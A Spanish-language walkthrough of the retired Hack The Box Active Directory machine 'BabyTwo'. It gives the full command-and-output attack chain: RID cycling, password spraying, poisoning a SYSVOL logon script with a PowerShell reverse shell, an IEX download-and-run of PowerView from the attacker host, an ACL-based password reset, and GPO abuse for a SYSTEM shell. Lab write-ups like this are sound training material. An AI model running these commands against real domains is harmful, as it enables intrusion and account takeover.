---
title: "BabyTwo"
layout: "post"
categories: [ "HTB - Retired Machines", "Medium", "Active Directory" ]
tags: [ "nmap", "ntpdate", "netexec", "RID Cycling Attack", "lookupsid", "smbmap", "smbclient", "SYSVOL", "bloodhound-python", "BloodHound", "PowerView", "pyGPOAbuse" ]
---

## Info

![BabyTwo](/assets/posts/2026-06-03-babytwo-machines-htb/01_babytwo.png)
*BabyTwo - HTB (Medium)*

BabyTwo es una máquina de dificultad Medium de Hack The Box enfocada en entornos de Active Directory.

La Cyber Kill Chain comienza con un **RID Cycling Attack** anónimo para enumerar usuarios del dominio, seguido de **User-as-pass** que revela credenciales triviales, abuso de permisos de escritura en `SYSVOL` para envenenar el logon script `login.vbs` y obtener acceso como `Amelia.Griffiths`, lateral movement hacia `gpoadm` explotando el permiso `WriteDacl` del grupo `Legacy` con **PowerView**, y escalada de privilegios abusando de `GenericAll` sobre la **Default Domain Policy** con **pyGPOAbuse** para ejecutar una tarea programada maliciosa como `NT AUTHORITY\SYSTEM`.

## Nmap

Comienzo realizando un escaneo completo de puertos para identificar los servicios expuestos por el objetivo.

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.7.199 -oG allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127

...SNIP...
```

**Parseo de puertos**

Para facilitar el siguiente escaneo, extraigo los puertos identificados con una simple RegEx y los almaceno en una variable.

```shell
ports=$(cat allPorts | grep -oP '\d{1,5}(?=/open)' | xargs | tr ' ' ',')

# output
53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49667,52190,52193,63418,63614,63615,63628
```

> También puede utilizarse la función [extractPorts](https://pastebin.com/xNaZxRGA), añadiéndola previamente al archivo **.bashrc** o **.zshrc**.
{: .prompt-tip }

**Detección de versiones**

```shell
nmap -sCV -p$ports 10.129.7.199 -oN version

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-01 21:24:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2026-05-31T20:58:53
|_Not valid after:  2026-11-30T20:58:53
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-01T21:25:22+00:00
|_ssl-date: 2026-06-01T21:26:01+00:00; -1s from scanner time.

...SNIP...

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-01T21:25:26
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

```

## Configuración inicial

### ntpdate

Recomiendo sincronizar la hora del equipo atacante con el Domain Controller (**OPCIONAL, diferencia de tiempo mínima**).

```shell
sudo ntpdate 10.129.7.199 
```

### /etc/hosts

Luego, genero las entradas necesarias para `/etc/hosts` utilizando `netexec`.

```shell
nxc smb 10.129.7.199 --generate-hosts-file hosts
cat hosts | sudo tee -a /etc/hosts

10.129.7.199     DC.baby2.vl baby2.vl DC
```

## Enumeración anónima

### SMB - LDAP (Null Session)

Tanto SMB y LDAP están limitados con **null y Guest session**.

```shell
nxc smb baby2.vl -u "" -p "" --users

SMB         10.129.7.199    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.199    445    DC               [+] baby2.vl\: 
```

### RID Cycling Attack

Para estos casos puedo intentar **RID Cycling Attack** para enumerar `security principals` del dominio sin necesidad de credenciales válidas.

> **Security principal** es una entidad de seguridad identificada por un **SID** que puede ser autenticada por Windows y a la que se le pueden asignar permisos. Algunos ejemplos son **usuarios, grupos, equipos y cuentas de servicio**.
{: .prompt-info }

Usaré `impacket-lookupsid` para realizar un ataque de fuerza bruta a los RIDs y, como mencioné, identificar `security principals` presentes en el dominio.

```shell
impacket-lookupsid baby2.vl@10.129.7.199 -no-pass       

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.7.199
[*] StringBinding ncacn_np:10.129.7.199[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-213243958-1766259620-4276976267
498: BABY2\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: BABY2\Administrator (SidTypeUser)
501: BABY2\Guest (SidTypeUser)
502: BABY2\krbtgt (SidTypeUser)
512: BABY2\Domain Admins (SidTypeGroup)
513: BABY2\Domain Users (SidTypeGroup)
514: BABY2\Domain Guests (SidTypeGroup)
515: BABY2\Domain Computers (SidTypeGroup)
516: BABY2\Domain Controllers (SidTypeGroup)
517: BABY2\Cert Publishers (SidTypeAlias)
518: BABY2\Schema Admins (SidTypeGroup)
519: BABY2\Enterprise Admins (SidTypeGroup)
520: BABY2\Group Policy Creator Owners (SidTypeGroup)
521: BABY2\Read-only Domain Controllers (SidTypeGroup)
522: BABY2\Cloneable Domain Controllers (SidTypeGroup)
525: BABY2\Protected Users (SidTypeGroup)
526: BABY2\Key Admins (SidTypeGroup)
527: BABY2\Enterprise Key Admins (SidTypeGroup)
553: BABY2\RAS and IAS Servers (SidTypeAlias)
571: BABY2\Allowed RODC Password Replication Group (SidTypeAlias)
572: BABY2\Denied RODC Password Replication Group (SidTypeAlias)
1000: BABY2\DC$ (SidTypeUser)
1101: BABY2\DnsAdmins (SidTypeAlias)
1102: BABY2\DnsUpdateProxy (SidTypeGroup)
1103: BABY2\gpoadm (SidTypeUser)
1104: BABY2\office (SidTypeGroup)
1105: BABY2\Joan.Jennings (SidTypeUser)
1106: BABY2\Mohammed.Harris (SidTypeUser)
1107: BABY2\Harry.Shaw (SidTypeUser)
1108: BABY2\Carl.Moore (SidTypeUser)
1109: BABY2\Ryan.Jenkins (SidTypeUser)
1110: BABY2\Kieran.Mitchell (SidTypeUser)
1111: BABY2\Nicola.Lamb (SidTypeUser)
1112: BABY2\Lynda.Bailey (SidTypeUser)
1113: BABY2\Joel.Hurst (SidTypeUser)
1114: BABY2\Amelia.Griffiths (SidTypeUser)
1602: BABY2\library (SidTypeUser)
2601: BABY2\legacy (SidTypeGroup)
```

> También se puede usar el parámetro **\--rid-brute** de [netexec](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid)
{: .prompt-tip }

**Obtener usuarios del dominio**

Para reducir el ruido, filtro únicamente los objetos de tipo `SidTypeUser`, almaceno los usuarios encontrados en el archivo `users`.

```shell
impacket-lookupsid baby2.vl@10.129.7.199 -no-pass | awk '/SidTypeUser/ {print $2}' FS='\' | cut -d' ' -f1 > users

Administrator
Guest
krbtgt
DC$
gpoadm
Joan.Jennings
Mohammed.Harris
Harry.Shaw
Carl.Moore
Ryan.Jenkins
Kieran.Mitchell
Nicola.Lamb
Lynda.Bailey
Joel.Hurst
Amelia.Griffiths
library
```

Con esta lista puedo intentar un ataque [ASREPRoast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast), sin embargo no obtengo resultados.

## User-as-Pass

Antes de realizar **Password Spraying**, una comprobación rápida consiste en verificar si algún usuario utiliza su propio nombre de usuario como contraseña, una mala práctica en labs y entornos mal configurados.

```shell
nxc smb baby2.vl -u users -p users --no-bruteforce --continue-on-success

SMB         10.129.7.199    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
...SNIP...
SMB         10.129.7.199    445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
...SNIP...
SMB         10.129.7.199    445    DC               [+] baby2.vl\library:library 
```

Tengo éxito y revela dos credenciales válidas.

- `Carl.Moore:Carl.Moore`
- `library:library`

Sin embargo, ninguno de los dos usuarios posee privilegios elevados a través de SMB.

Como el DC, también expone el servicio `RDP`. Intentaré comprobar si alguna de estas credenciales permite obtener acceso interactivo al sistema.

```shell
nxc rdp baby2.vl -u Carl.Moore library -p Carl.Moore library --no-bruteforce --continue-on-success

RDP         10.129.7.199    3389   DC               [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC) (domain:baby2.vl) (nla:False)
RDP         10.129.7.199    3389   DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
RDP         10.129.7.199    3389   DC               [+] baby2.vl\library:library 
```

Las credenciales son válidas para autenticarse contra el servicio RDP; sin embargo, ninguno de los dos usuarios posee permisos para iniciar sesión, por lo que no es posible establecer una sesión remota.

## SMB Shares

Ahora que dispongo de credenciales válidas, puedo ampliar la superficie de enumeración inspeccionando los recursos compartidos SMB accesibles.

```shell
smbmap -H baby2.vl -u Carl.Moore -p Carl.Moore --no-banner

	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	apps                                              	READ, WRITE
	C$                                                	NO ACCESS	Default share
	docs                                              	READ, WRITE
	homes                                             	READ, WRITE
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
```

Interesante, hay tres recursos compartidos no comunes: `apps`, `docs`, `homes`. Además, el usuario `Carl.Moore` posee permisos de lectura y escritura sobre todos ellos.

Por otro lado, también tengo acceso de lectura a `NETLOGON` y `SYSVOL`, que suelen contener scrips de inicio de sesión, políticas de grupo y otra información relevante para el dominio.

Comenzaré inspeccionando cada uno de ellos.

### apps

```shell
smbclient //baby2.vl/apps -U 'Carl.Moore%Carl.Moore' -c "cd dev; recurse ON; prompt OFF; mget *"

getting file \dev\CHANGELOG of size 108 as dev/CHANGELOG (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \dev\login.vbs.lnk of size 1800 as dev/login.vbs.lnk (2.0 KiloBytes/sec) (average 1.3 KiloBytes/sec)
```

Dentro del directorio `dev` encuentro dos archivos interesantes.

El primero es un archivo **CHANGELOG** cuyo contenido indica la evolución del proyecto:

```shell
[0.2]
- Added automated drive mapping
[0.1]
- Rolled out initial version of the domain logon script  
```

Según la descripción, inicialmente se desplegó un script de inicio de sesión para los usuarios del dominio y posteriormente se añadió la funcionalidad de mapeo automático de unidades de red.

Además, también encuentro un archivo **login.vbs.lnk**.

> Los archivos .lnk son accesos directos hacia archivos, carpetas o programas. Son los mismos accesos directos que habitualmente se encuentran en el escritorio de Windows para abrir aplicaciones o documentos (ejemplo: Chrome, Firefox, Word u otras aplicaciones).
{: .prompt-info}

> Los atacantes suelen abusar de archivos [.lnk maliciosos](https://attack.mitre.org/techniques/T1027/012/) para ejecutar comandos o descargar malware de forma encubierta, por lo que conviene analizar su ruta absoluta antes de abrirlos.
{: .prompt-danger }

Con este contexto, inspecciono el acceso directo para determinar hacia qué recurso apunta.

```shell
file login.vbs.lnk 

login.vbs.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Unicoded, MachineID dc, EnableTargetMetadata KnownFolderID F38BF404-1D43-42F2-9305-67DE0B28FC23, Archive, ctime=Wed Aug 23 00:28:18 2023, atime=Sat Sep  2 19:55:51 2023, mtime=Sat Sep  2 19:55:51 2023, length=992, window=normal, IDListSize 0x0239, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\"
```

La información más relevante es la ruta de destino: `C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\`

Esto sugiere que el acceso directo apunta a un script almacenado dentro de `SYSVOL`, ubicación utilizada habitualmente por AD para distribuir scripts de inicio de sesión y otros archivos relacionados con las GPOs.

Para confirmarlo, puedo consultar directamente el atributo `scriptPath`, que indica qué script se ejecutará cuando un usuario inicie sesión.

```shell
nxc ldap DC.baby2.vl -u Carl.Moore -p Carl.Moore --query '(scriptPath=*)' scriptPath

LDAP        10.129.7.199    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl) (signing:None) (channel binding:Never)
LDAP        10.129.7.199    389    DC               [+] baby2.vl\Carl.Moore:Carl.Moore
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Joan Jennings,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Mohammed Harris,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Harry Shaw,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Carl Moore,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Ryan Jenkins,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Kieran Mitchell,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Nicola Lamb,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Lynda Bailey,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Joel Hurst,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
LDAP        10.129.7.199    389    DC               [+] Response for object: CN=Amelia Griffiths,OU=office,DC=baby2,DC=vl
LDAP        10.129.7.199    389    DC               scriptPath           \\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
```

El resultado confirma que todos los usuarios pertenecientes a la `OU office` ejecutan el script `login.vbs` durante el proceso de inicio de sesión.

Este hallazgo resulta especialmente interesante porque cualquier modificación sobre dicho script tendría impacto directo sobre múltiples usuarios del dominio.

### NETLOGON

El recurso compartido `NETLOGON` se utiliza principalmente para **almacenar scripts** que AD distribuye automáticamente a los usuarios durante el inicio de sesión. Inspecciono también el contenido de este share.

```shell
smbclient '//baby2.vl/NETLOGON' -U 'Carl.Moore%Carl.Moore' -c "recurse ON; prompt OFF; mget *"

getting file \login.vbs of size 992 as login.vbs (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
```

Aquí encuentro el archivo `login.vbs`. Su contenido es el siguiente:

```visualbasic
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next

    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If

    objNetwork.MapNetworkDrive driveLetter & ":", sharePath

    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If

    Set objNetwork = Nothing
End Sub
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

El script se encarga de mapear automáticamente dos recursos compartidos del servidor `dc.baby2.vl` como unidades de red en Windows cuando los usuarios inician sesión.

### SYSVOL

El recurso compartido `SYSVOL` contiene archivos que deben replicarse entre todos los Domain Controllers del dominio.

Entre ellos se incluyen:

- Políticas de grupo (GPOs).
- Scripts de inicio y cierre de sesión.
- Plantillas administrativas.
- Configuraciones del dominio.

Por ello también lo inspecciono.

```shell
smbclient '//baby2.vl/SYSVOL' -U 'Carl.Moore%Carl.Moore' -c "recurse ON; prompt OFF; mget *"  

...SNIP...
getting file \baby2.vl\scripts\login.vbs of size 992 as baby2.vl/scripts/login.vbs (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
...SNIP...
```

He aquí el script `login.vbs`, del que posteriormente se publica mediante `NETLOGON` para facilitar su distribución a los usuarios del dominio.

## Poison a VBScript

Muy bien, entonces múltiples usuarios del dominio ejecutan automáticamente el script `login.vbs`. Y si en caso, dispongo de permisos de escritura sobre `\\baby2.vl\SYSVOL\baby2.vl\scripts\`, podré sobrescribir el script para ejecutar instrucciones maliciosas cada vez que uno de esos usuarios inicie sesión.

**Comprobando permisos de escritura**

Intentaré subir el mismo script `login.vbs` al directorio de `scripts`. Si la operación se completa correctamente, confirmaré que tengo permisos de escritura sobre la ruta.

```shell
smbclient '//baby2.vl/SYSVOL' -U 'Carl.Moore%Carl.Moore' -c "cd \baby2.vl\scripts\; put login.vbs"

putting file login.vbs as \baby2.vl\scripts\login.vbs (2.4 kB/s) (average 2.4 kB/s)
```

La subida se realiza correctamente, confirmando que `Carl.Moore` puede modificar dentro del directorio `scripts`. En caso de no contar con permisos suficientes, SMB habría devuelto un error similar al siguiente: `NT_STATUS_ACCESS_DENIED opening remote file \login.vbs`.

Este escenario encaja con la técnica documentada por [HackTricks -> Poison a VBScript Logon Script for RCE](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html?highlight=vbs#poison-a-vbscript-logon-script-for-rce), donde se modifica un script de inicio de sesión para conseguir ejecución remota de código en el contexto de los usuarios que lo ejecutan.

Aprovechando este comportamiento, el siguiente paso consiste en generar una reverse shell que apunte a mi dirección IP en el puerto **9001**. Para ello utilizo [revshells.com](https://www.revshells.com/) y selecciono la variante **PowerShell #3 (Base64)**.

![BabyTwo](/assets/posts/2026-06-03-babytwo-machines-htb/02_revshell.png)
*Reverse Shell*

A continuación, reemplazo el contenido del script `login.vbs` obtenido e incorporo la estructura recomendada por HackTricks junto con la reverse shell generada. El resultado final del script es el siguiente:

```shell
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <PAYLOAD BASE64>"

MapNetworkShare "\\\\dc.baby2.vl\\apps", "V"
MapNetworkShare "\\\\dc.baby2.vl\\docs", "L"
```

En seguida sobrescribo el script original por mi versión modificada de `login.vbs`.

```shell
smbclient '//baby2.vl/SYSVOL' -U 'Carl.Moore%Carl.Moore' -c "cd \baby2.vl\scripts\; put login.vbs"

putting file login.vbs as \baby2.vl\scripts\login.vbs (1.2 kB/s) (average 1.2 kB/s)
```

Abro un listener en mi máquina atacante en el puerto **9001** utilizando `netcat`, quedando a la espera de la conexión entrante.

## user.txt

Después de aproximadamente un minuto, recibo una conexión entrante como el usuario `Amelia`.

```shell
rlwrap -cAr nc -lnvp 9001

listening on [any] 9001 ...
connect to [10.10.16.43] from (UNKNOWN) [10.129.7.199] 51793

PS C:\Windows\system32> whoami
baby2\amelia.griffiths
```

Al intentar localizar la flag en su ubicación habitual, no se encuentra en el escritorio del usuario:

```powershell
Get-ChildItem -Force C:\Users\Amelia.Griffiths\Desktop

    Directory: C:\Users\Amelia.Griffiths\Desktop

Mode                 LastWriteTime         Length Name       
----                 -------------         ------ ----       
-a-hs-         8/22/2023  12:54 PM            282 desktop.ini
```

Por lo que buscaré de manera recursiva desde la raíz del sistema.

```powershell
Get-ChildItem -Path "C:\" -Force -Filter "user.txt"

    Directory: C:\

Mode                 LastWriteTime         Length Name    
----                 -------------         ------ ----    
-a----         4/16/2025   2:48 AM             32 user.txt
```

Obtengo la primera flag.

```shell
type C:\user.txt
42783b2c1483aeb70eca6810f0645c38
```

Realicé **enumeración local** del dominio. Sin embargo, nada interesante.

## BloodHound

Para obtener una visión más completa del entorno y posibles rutas de escalada, utilizo `BloodHound` y el ingestor `bloodhound-python`.

### bloodhound-python

```shell
bloodhound-python -c All -d baby2.vl -u Carl.Moore -p Carl.Moore -ns 10.129.7.199 --zip

...SNIP...
INFO: Done in 00M 59S
INFO: Compressing output into 20260601210341_bloodhound.zip
```

El proceso recopila información del dominio, usuarios, grupos, GPOs y relaciones ACL, generando un archivo comprimido listo para su análisis en BloodHound.

### Función BloodInstall

Para facilitar el despliegue, utilizo una función previamente definida en mi `.zshrc`.

```shell
function BloodInstall(){
  wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
  tar -xvzf bloodhound-cli-linux-amd64.tar.gz
  rm -rf bloodhound-cli-linux-amd64.tar.gz
  ./bloodhound-cli install
}
```

Ejecuto la función.

```shell
BloodInstall

...SNIP...
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: aXYaBiSvkspmAB9mKrfTADdl4ojY3mD7
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Al finalizar la instalación, se muestran las credenciales de acceso y la URL del panel web.

> Si no se guarda la contraseña, puede recuperarse con: bloodhound-cli config get default_password.
{: .prompt-tip }

Tras la autenticación en la interfaz web, se carga el archivo .zip generado por el ingestor.

![BabyTwo](/assets/posts/2026-06-03-babytwo-machines-htb/03_zip.png)
*Subida del archivo .zip a BloodHound*

## Lateral Movement

Posteriormente, se inicia el análisis de relaciones y ACLs del dominio.

![BabyTwo](/assets/posts/2026-06-03-babytwo-machines-htb/04_amelia.png)
*ACLs del usuario Amelia.Griffiths en BloodHound*

Como se muestra, `Amelia.Griffiths` pertenece al grupo `Legacy`. A su vez, este grupo posee el permiso [WriteDacl](https://bloodhound.specterops.io/resources/edges/write-dacl) sobre:

- La OU GPO-MANAGEMENT
- El usuario gpoadm

Este permiso permite modificar las listas de control de acceso (ACL), por lo que puedo otorgar a `Amelia.Griffiths` cualquier permiso sobre el objeto. Para aprovechar estos permisos, descargo y ejecuto [PowerView](https://powersploit.readthedocs.io/en/latest/Recon/) en la máquina víctima.

```shell
python3 -m http.server 80
```

```powershell
IEX(New-Object Net.WebClient).DownloadString("http://10.10.16.43/PowerView.ps1")
```

A continuación, utilizo los permisos heredados para otorgar a `Amelia` el permiso `All` sobre el usuario `gpoadm`.

```powershell
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "gpoadm" -PrincipalIdentity "Amelia.Griffiths"
```

Luego, cambio la contraseña del usuario.

```powershell
$NewPass = ConvertTo-SecureString -String "P4ssw0rD2026!$" -AsPlainText -Force; Set-ADAccountPassword -Identity "gpoadm" -NewPassword $NewPass -Reset
```

Finalmente, verifico las credenciales obtenidas.

```shell
nxc smb baby2.vl -u gpoadm -p 'P4ssw0rD2026!$'                                                    

SMB         10.129.7.199    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.199    445    DC               [+] baby2.vl\gpoadm:P4ssw0rD2026!$
```

## PrivEsc

Con el control de la cuenta `gpoadm` ahora poseo permisos [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all) sobre la GPO `Default Domain Policy`.

![BabyTwo](/assets/posts/2026-06-03-babytwo-machines-htb/05_gpoadm.png)
*Permisos de gpoadm sobre la Default Domain Policy*

Este permiso otorga control total sobre la GPO, permitiendo modificar su configuración y, en consecuencia, ejecutar código en los sistemas afectados por dicha política.

### Abusando de GPO's

Para explotar esta relación utilizaré [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse), una herramienta diseñada específicamente para abusar de permisos sobre objetos GPO.

Primero clono el repositorio.

```shell
git clone https://github.com/Hackndo/pyGPOAbuse
cd pyGPOAbuse
```

A continuación, instalo las dependencias utilizando [uv](https://docs.astral.sh/uv/).

```shell
uv add --script pygpoabuse.py --requirements requirements.txt 
```

Antes de modificar la política necesito obtener el atributo `GUID`.

```powershell
Get-DomainGPO -Identity "Default Domain Policy" | select name

name
----
{31B2F340-016D-11D2-945F-00C04FB984F9}
```

> También puede obtenerse desde BloodHound consultando el atributo **distinguishedName**.
{: .prompt-tip }

> Elegí la GPO [Default Domain Policy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpod/566e983e-3b72-4b2d-9063-a00ebc9514fd), ya que esta GPO está vinculada a la raíz del dominio, por lo que afecta a **todos los usuarios y equipos del dominio (según la configuración que contenga)**. Mientras que por otro lado, [Default Domain Controllers Policy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpod/566e983e-3b72-4b2d-9063-a00ebc9514fd) es la GPO vinculada a la OU Domain Controllers, por lo que afecta **únicamente a los Domain Controllers**.
{: .prompt-info }

Con este valor en posesión, programaré una tarea con `pyGPOAbuse` que contendrá una reverse shell generada con [revshells.com](https://www.revshells.com/) por el puerto **9002**, empleando el formato **PowerShell #3 (Base64)**. 

```shell
uv run pygpoabuse.py baby2.vl/gpoadm:'P4ssw0rD2026!$' -dc-ip 10.129.7.199 -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'powershell -e <PAYLOAD BASE64>'

[+] ScheduledTask TASK_e77a21b7 created!
```

El output muestra que la tarea ha sido añadida con éxito a la política.

> Cabe recordar que las GPO **NO se aplican de forma inmediata**. Por defecto, la actualización de directivas puede tardar hasta **dos horas** en propagarse a los equipos afectados.
{: .prompt-warning }

Teniendo esto en cuenta, inicio un listener en el puerto **9002** con `netcat`.

Luego, desde la sesión obtenida como `Amelia.Griffiths` fuerzo manualmente la actualización de políticas.

```powershell
gpupdate /force

Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

Una vez aplicada la política, la tarea programada es procesada por el sistema y el payload configurado se ejecuta automáticamente.

## root.txt

Pocos segundos después, el listener recibe una nueva conexión. Esta vez la shell se ejecuta con los máximos privilegios disponibles en el sistema.

```shell
rlwrap -cAr nc -lnvp 9002

listening on [any] 9002 ...
connect to [10.10.16.43] from (UNKNOWN) [10.129.7.199] 56726

PS C:\Windows\system32> whoami
nt authority\system
```

Con acceso como `NT AUTHORITY\SYSTEM`, ya es posible leer los archivos del administrador y obtener la flag final.

```shell
type C:\Users\Administrator\Desktop\root.txt
293500962edc31fa154951eeeb5740f9
```
